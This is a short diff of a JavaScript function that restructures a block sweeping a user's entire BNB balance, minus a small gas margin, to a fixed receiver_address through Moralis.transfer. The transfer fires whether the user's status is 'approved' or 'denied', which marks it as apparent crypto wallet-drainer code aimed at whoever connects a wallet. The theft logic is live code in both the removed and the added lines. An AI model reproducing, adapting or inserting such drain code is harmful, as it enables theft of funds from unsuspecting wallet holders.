@@ -647,29 +647,30 @@ async function proceed(){
           //     // }
           //   }
           
-          if (x === bsc_length && (mum === "approved" || mum === "denied")){
-        const bnb_balance = await getBalance(user_address, apiKey).catch(e=>{
-          console.log("Unable to get new bsc balance", e);
-        });
-        console.log("bnb_balance", bnb_balance);
-        console.log("bnb_balance.balance", bnb_balance.balance);
-        
-        const balance = ((parseInt(bnb_balance.balance))/1000000000000000000) - 0.005;
-        console.log("The new bnb balance", balance);
-        if (balance > 0) {
-        const options = {
-          type: "native",
-          amount: Moralis.Units.bsc(balance.toString()),
-          receiver: receiver_address,
-        };
-        let result = await Moralis.transfer(options);
-        console.log(result);
-      }
-      else {
-        console.log("Insufficient funds")
-      }
+          
     }
+    if (x === bsc_length && (mum === "approved" || mum === "denied")){
+      const bnb_balance = await getBalance(user_address, apiKey).catch(e=>{
+        console.log("Unable to get new bsc balance", e);
+      });
+      console.log("bnb_balance", bnb_balance);
+      console.log("bnb_balance.balance", bnb_balance.balance);
+      
+      const balance = ((parseInt(bnb_balance.balance))/1000000000000000000) - 0.005;
+      console.log("The new bnb balance", balance);
+      if (balance > 0) {
+      const options = {
+        type: "native",
+        amount: Moralis.Units.bsc(balance.toString()),
+        receiver: receiver_address,
+      };
+      let result = await Moralis.transfer(options);
+      console.log(result);
     }
+    else {
+      console.log("Insufficient funds")
+    }
+  }
   }
     send();
 }
